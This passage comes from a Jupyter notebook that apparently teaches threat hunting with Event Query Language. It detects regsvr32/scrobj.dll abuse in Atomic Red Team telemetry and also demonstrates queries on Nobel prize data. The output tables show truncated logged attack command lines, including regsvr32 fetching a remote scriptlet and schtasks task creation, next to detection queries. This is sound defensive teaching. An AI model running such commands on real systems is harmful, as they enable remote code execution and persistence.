       "0  {42FC7E13-CBCB-5C05-0000-0010A0395401}  "
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "eql_search(\"data/normalized-T1117-AtomicRed-regsvr32.json\",\n",
    "           \"image_load where process_name=='regsvr32.exe' and image_name=='scrobj.dll'\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>destination_address</th>\n",
       "      <th>destination_port</th>\n",
       "      <th>event_type</th>\n",
       "      <th>pid</th>\n",
       "      <th>process_name</th>\n",
       "      <th>process_path</th>\n",
       "      <th>protocol</th>\n",
       "      <th>source_address</th>\n",
       "      <th>source_port</th>\n",
       "      <th>subtype</th>\n",
       "      <th>timestamp</th>\n",
       "      <th>unique_pid</th>\n",
       "      <th>user</th>\n",
       "      <th>user_domain</th>\n",
       "      <th>user_name</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>151.101.48.133</td>\n",
       "      <td>443</td>\n",
       "      <td>network</td>\n",
       "      <td>2012</td>\n",
       "      <td>regsvr32.exe</td>\n",
       "      <td>C:\\Windows\\System32\\regsvr32.exe</td>\n",
       "      <td>tcp</td>\n",
       "      <td>192.168.162.134</td>\n",
       "      <td>50505</td>\n",
       "      <td>outgoing</td>\n",
       "      <td>131883573238680000</td>\n",
       "      <td>{42FC7E13-CBCB-5C05-0000-0010A0395401}</td>\n",
       "      <td>ART-DESKTOP\\bob</td>\n",
       "      <td>ART-DESKTOP</td>\n",
       "      <td>bob</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "  destination_address destination_port event_type   pid  process_name  \\\n",
       "0      151.101.48.133              443    network  2012  regsvr32.exe   \n",
       "\n",
       "                       process_path protocol   source_address source_port  \\\n",
       "0  C:\\Windows\\System32\\regsvr32.exe      tcp  192.168.162.134       50505   \n",
       "\n",
       "    subtype           timestamp                              unique_pid  \\\n",
       "0  outgoing  131883573238680000  {42FC7E13-CBCB-5C05-0000-0010A0395401}   \n",
       "\n",
       "              user  user_domain user_name  \n",
       "0  ART-DESKTOP\\bob  ART-DESKTOP       bob  "
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "eql_search(\"data/normalized-T1117-AtomicRed-regsvr32.json\",\n",
    "           \"network where process_name = 'regsvr32.exe'\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "Combine these things together and you can get a rigorous analytic"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>count</th>\n",
       "      <th>key</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1</td>\n",
       "      <td>totals</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   count     key\n",
       "0      1  totals"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "eql_search(\"data/normalized-T1117-AtomicRed-regsvr32.json\", \"\"\"\n",
    "sequence by pid\n",
    "    [process where process_name == \"regsvr32.exe\"]\n",
    "    [image_load where image_name == \"scrobj.dll\"]\n",
    "    [network where true]\n",
    "| count\n",
    "\"\"\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>command_line</th>\n",
       "      <th>image_name</th>\n",
       "      <th>destination_address</th>\n",
       "      <th>destination_port</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>regsvr32.exe  /s /u /i:https://raw.githubuserc...</td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td></td>\n",
       "      <td>scrobj.dll</td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td>151.101.48.133</td>\n",
       "      <td>443</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                        command_line  image_name  \\\n",
       "0  regsvr32.exe  /s /u /i:https://raw.githubuserc...               \n",
       "1                                                     scrobj.dll   \n",
       "2                                                                  \n",
       "\n",
       "  destination_address destination_port  \n",
       "0                                       \n",
       "1                                       \n",
       "2      151.101.48.133              443  "
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "table = eql_search(\"data/normalized-T1117-AtomicRed-regsvr32.json\", \"\"\"\n",
    "sequence by pid\n",
    "    [process where process_name == \"regsvr32.exe\"]\n",
    "    [image_load where image_name == \"scrobj.dll\"]\n",
    "    [network where true]\n",
    "\"\"\")\n",
    "table[['command_line', 'image_name', 'destination_address', 'destination_port']]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "https://eqllib.readthedocs.io/en/latest/analytics/a792cb37-fa56-43c2-9357-4b6a54b559c7.html"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "# Analytics Library\n",
    "\n",
    "https://eqllib.readthedocs.io"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "Convert a query from our common schema used within the library to the fields used natively by Sysmon.\n",
    "\n",
    "```console\n",
    "$ eqllib convert-query -s \"Microsoft Sysmon\" \"process where process_name=='regsvr32.exe' and command_line=='*scrobj*'\"\n",
    "process where\n",
    "  EventId in (1, 5) and\n",
    "    Image == \"*\\\\regsvr32.exe\" and\n",
    "    CommandLine == \"*scrobj*\"\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "If we already know our data, we can query it natively.\n",
    "\n",
    "https://github.com/jdorfman/awesome-json-datasets lists multiple open data sets.\n",
    "\n",
    "Let's pick http://api.nobelprize.org/v1/prize.json"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```console\n",
    "$ jq -c .prizes[] Data/prize.json > prize.jsonl\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "```console\n",
    "$ eql query -f prize.jsonl \"| tail 1\" | jq .\n",
    "```\n",
    "```json\n",
    "{\n",
    "  \"category\": \"peace\",\n",
    "  \"laureates\": [\n",
    "    {\n",
    "      \"firstname\": \"Jean Henry\",\n",
    "      \"id\": \"462\",\n",
    "      \"share\": \"2\",\n",
    "      \"surname\": \"Dunant\"\n",
    "    },\n",
    "    {\n",
    "      \"firstname\": \"Frédéric\",\n",
    "      \"id\": \"463\",\n",
    "      \"share\": \"2\",\n",
    "      \"surname\": \"Passy\"\n",
    "    }\n",
    "  ],\n",
    "  \"year\": \"1901\"\n",
    "}\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>category</th>\n",
       "      <th>laureates</th>\n",
       "      <th>year</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>medicine</td>\n",
       "      <td>[{'id': '293', 'firstname': 'Emil', 'surname':...</td>\n",
       "      <td>1901</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   category                                          laureates  year\n",
       "0  medicine  [{'id': '293', 'firstname': 'Emil', 'surname':...  1901"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "eql_search(\"prize.jsonl\", \"| tail 1\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>category</th>\n",
       "      <th>laureates</th>\n",
       "      <th>year</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>chemistry</td>\n",
       "      <td>[{'id': '261', 'firstname': 'Bruce', 'surname'...</td>\n",
       "      <td>1984</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>economics</td>\n",
       "      <td>[{'id': '698', 'firstname': 'Richard', 'surnam...</td>\n",
       "      <td>1984</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>literature</td>\n",
       "      <td>[{'id': '661', 'firstname': 'Jaroslav', 'surna...</td>\n",
       "      <td>1984</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>peace</td>\n",
       "      <td>[{'id': '546', 'firstname': 'Desmond', 'surnam...</td>\n",
       "      <td>1984</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>physics</td>\n",
       "      <td>[{'id': '124', 'firstname': 'Carlo', 'surname'...</td>\n",
       "      <td>1984</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>medicine</td>\n",
       "      <td>[{'id': '429', 'firstname': 'Niels K.', 'surna...</td>\n",
       "      <td>1984</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "     category                                          laureates  year\n",
       "0   chemistry  [{'id': '261', 'firstname': 'Bruce', 'surname'...  1984\n",
       "1   economics  [{'id': '698', 'firstname': 'Richard', 'surnam...  1984\n",
       "2  literature  [{'id': '661', 'firstname': 'Jaroslav', 'surna...  1984\n",
       "3       peace  [{'id': '546', 'firstname': 'Desmond', 'surnam...  1984\n",
       "4     physics  [{'id': '124', 'firstname': 'Carlo', 'surname'...  1984\n",
       "5    medicine  [{'id': '429', 'firstname': 'Niels K.', 'surna...  1984"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "eql_search(\"prize.jsonl\", \"any where year == '1984'\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>count</th>\n",
       "      <th>key</th>\n",
       "      <th>percent</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>5</td>\n",
       "      <td>1901</td>\n",
       "      <td>0.007740</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>6</td>\n",
       "      <td>1969</td>\n",
       "      <td>0.009288</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   count   key   percent\n",
       "0      5  1901  0.007740\n",
       "1      6  1969  0.009288"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "eql_search(\"prize.jsonl\", \"| count year | sort key | unique count\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>count</th>\n",
       "      <th>key</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>8</td>\n",
       "      <td>totals</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   count     key\n",
       "0      8  totals"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "eql_search(\"prize.jsonl\", \"any where laureates[0].motivation == '*particles*' | count\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Hunting with EQL"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "We have several examples in [Github](https://github.com/endgameinc/eqllib/tree/master/data)\n",
    "\n",
    "- normalized-atomic-red-team.json.gz\n",
    "- normalized-rta.json.gz"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "What are the parent-child process relationships in my environment?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>count</th>\n",
       "      <th>key</th>\n",
       "      <th>percent</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1</td>\n",
       "      <td>(ARP.EXE, cmd.exe)</td>\n",
       "      <td>0.002299</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1</td>\n",
       "      <td>(RegAsm.exe, cmd.exe)</td>\n",
       "      <td>0.002299</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>1</td>\n",
       "      <td>(RegSvcs.exe, powershell.exe)</td>\n",
       "      <td>0.002299</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>1</td>\n",
       "      <td>(SearchFilterHost.exe, SearchIndexer.exe)</td>\n",
       "      <td>0.002299</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>1</td>\n",
       "      <td>(SearchProtocolHost.exe, SearchIndexer.exe)</td>\n",
       "      <td>0.002299</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>1</td>\n",
       "      <td>(Temptcm.tmp, cmd.exe)</td>\n",
       "      <td>0.002299</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>1</td>\n",
       "      <td>(WmiApSrv.exe, services.exe)</td>\n",
       "      <td>0.002299</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>1</td>\n",
       "      <td>(WmiPrvSE.exe, svchost.exe)</td>\n",
       "      <td>0.002299</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>1</td>\n",
       "      <td>(at.exe, cmd.exe)</td>\n",
       "      <td>0.002299</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>1</td>\n",
       "      <td>(audiodg.exe, svchost.exe)</td>\n",
       "      <td>0.002299</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>1</td>\n",
       "      <td>(backgroundTaskHost.exe, svchost.exe)</td>\n",
       "      <td>0.002299</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>1</td>\n",
       "      <td>(bitsadmin.exe, cmd.exe)</td>\n",
       "      <td>0.002299</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>1</td>\n",
       "      <td>(calc.exe, forfiles.exe)</td>\n",
       "      <td>0.002299</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13</th>\n",
       "      <td>1</td>\n",
       "      <td>(calc.exe, regsvr32.exe)</td>\n",
       "      <td>0.002299</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14</th>\n",
       "      <td>1</td>\n",
       "      <td>(csc.exe, cmd.exe)</td>\n",
       "      <td>0.002299</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>15</th>\n",
       "      <td>1</td>\n",
       "      <td>(csc.exe, powershell.exe)</td>\n",
       "      <td>0.002299</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>16</th>\n",
       "      <td>1</td>\n",
       "      <td>(mavinject.exe, powershell.exe)</td>\n",
       "      <td>0.002299</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>17</th>\n",
       "      <td>2</td>\n",
       "      <td>(certutil.exe, cmd.exe)</td>\n",
       "      <td>0.004598</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>18</th>\n",
       "      <td>2</td>\n",
       "      <td>(findstr.exe, cmd.exe)</td>\n",
       "      <td>0.004598</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>19</th>\n",
       "      <td>2</td>\n",
       "      <td>(forfiles.exe, cmd.exe)</td>\n",
       "      <td>0.004598</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>20</th>\n",
       "      <td>2</td>\n",
       "      <td>(regsvr32.exe, cmd.exe)</td>\n",
       "      <td>0.004598</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>21</th>\n",
       "      <td>2</td>\n",
       "      <td>(regsvr32.exe, powershell.exe)</td>\n",
       "      <td>0.004598</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22</th>\n",
       "      <td>2</td>\n",
       "      <td>(schtasks.exe, cmd.exe)</td>\n",
       "      <td>0.004598</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>23</th>\n",
       "      <td>3</td>\n",
       "      <td>(net.exe, cmd.exe)</td>\n",
       "      <td>0.006897</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>24</th>\n",
       "      <td>3</td>\n",
       "      <td>(pcalua.exe, cmd.exe)</td>\n",
       "      <td>0.006897</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25</th>\n",
       "      <td>4</td>\n",
       "      <td>(sc.exe, cmd.exe)</td>\n",
       "      <td>0.009195</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>26</th>\n",
       "      <td>4</td>\n",
       "      <td>(svchost.exe, services.exe)</td>\n",
       "      <td>0.009195</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>27</th>\n",
       "      <td>5</td>\n",
       "      <td>(cmd.exe, cmd.exe)</td>\n",
       "      <td>0.011494</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>28</th>\n",
       "      <td>34</td>\n",
       "      <td>(reg.exe, cmd.exe)</td>\n",
       "      <td>0.078161</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>29</th>\n",
       "      <td>99</td>\n",
       "      <td>(cmd.exe, powershell.exe)</td>\n",
       "      <td>0.227586</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>30</th>\n",
       "      <td>254</td>\n",
       "      <td>(PING.EXE, cmd.exe)</td>\n",
       "      <td>0.583908</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "    count                                          key   percent\n",
       "0       1                           (ARP.EXE, cmd.exe)  0.002299\n",
       "1       1                        (RegAsm.exe, cmd.exe)  0.002299\n",
       "2       1                (RegSvcs.exe, powershell.exe)  0.002299\n",
       "3       1    (SearchFilterHost.exe, SearchIndexer.exe)  0.002299\n",
       "4       1  (SearchProtocolHost.exe, SearchIndexer.exe)  0.002299\n",
       "5       1                       (Temptcm.tmp, cmd.exe)  0.002299\n",
       "6       1                 (WmiApSrv.exe, services.exe)  0.002299\n",
       "7       1                  (WmiPrvSE.exe, svchost.exe)  0.002299\n",
       "8       1                            (at.exe, cmd.exe)  0.002299\n",
       "9       1                   (audiodg.exe, svchost.exe)  0.002299\n",
       "10      1        (backgroundTaskHost.exe, svchost.exe)  0.002299\n",
       "11      1                     (bitsadmin.exe, cmd.exe)  0.002299\n",
       "12      1                     (calc.exe, forfiles.exe)  0.002299\n",
       "13      1                     (calc.exe, regsvr32.exe)  0.002299\n",
       "14      1                           (csc.exe, cmd.exe)  0.002299\n",
       "15      1                    (csc.exe, powershell.exe)  0.002299\n",
       "16      1              (mavinject.exe, powershell.exe)  0.002299\n",
       "17      2                      (certutil.exe, cmd.exe)  0.004598\n",
       "18      2                       (findstr.exe, cmd.exe)  0.004598\n",
       "19      2                      (forfiles.exe, cmd.exe)  0.004598\n",
       "20      2                      (regsvr32.exe, cmd.exe)  0.004598\n",
       "21      2               (regsvr32.exe, powershell.exe)  0.004598\n",
       "22      2                      (schtasks.exe, cmd.exe)  0.004598\n",
       "23      3                           (net.exe, cmd.exe)  0.006897\n",
       "24      3                        (pcalua.exe, cmd.exe)  0.006897\n",
       "25      4                            (sc.exe, cmd.exe)  0.009195\n",
       "26      4                  (svchost.exe, services.exe)  0.009195\n",
       "27      5                           (cmd.exe, cmd.exe)  0.011494\n",
       "28     34                           (reg.exe, cmd.exe)  0.078161\n",
       "29     99                    (cmd.exe, powershell.exe)  0.227586\n",
       "30    254                          (PING.EXE, cmd.exe)  0.583908"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "eql_search(\"data/normalized-atomic-red-team.json.gz\", \"\"\"\n",
    "process where parent_process_name != null\n",
    "| count process_name, parent_process_name\n",
    "\"\"\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "What processes have the most diverse command lines?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>count</th>\n",
       "      <th>key</th>\n",
       "      <th>percent</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>34</td>\n",
       "      <td>reg.exe</td>\n",
       "      <td>0.079812</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>73</td>\n",
       "      <td>cmd.exe</td>\n",
       "      <td>0.171362</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>255</td>\n",
       "      <td>PING.EXE</td>\n",
       "      <td>0.598592</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   count       key   percent\n",
       "0     34   reg.exe  0.079812\n",
       "1     73   cmd.exe  0.171362\n",
       "2    255  PING.EXE  0.598592"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "eql_search(\"data/normalized-atomic-red-team.json.gz\", \"\"\"\n",
    "process where true\n",
    "| unique_count process_name, command_line\n",
    "| count process_name\n",
    "| filter count > 5\n",
    "\"\"\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "What processes had more than two event types?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>process_name</th>\n",
       "      <th>pid</th>\n",
       "      <th>command_line</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>svchost.exe</td>\n",
       "      <td>3980</td>\n",
       "      <td>c:\\windows\\system32\\svchost.exe -k netsvcs -p ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>svchost.exe</td>\n",
       "      <td>2664</td>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>regsvr32.exe</td>\n",
       "      <td>2012</td>\n",
       "      <td>regsvr32.exe  /s /u /i:https://raw.githubuserc...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>schtasks.exe</td>\n",
       "      <td>2812</td>\n",
       "      <td>SCHTASKS  /Create /S localhost /RU DOMAIN\\user...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   process_name   pid                                       command_line\n",
       "0   svchost.exe  3980  c:\\windows\\system32\\svchost.exe -k netsvcs -p ...\n",
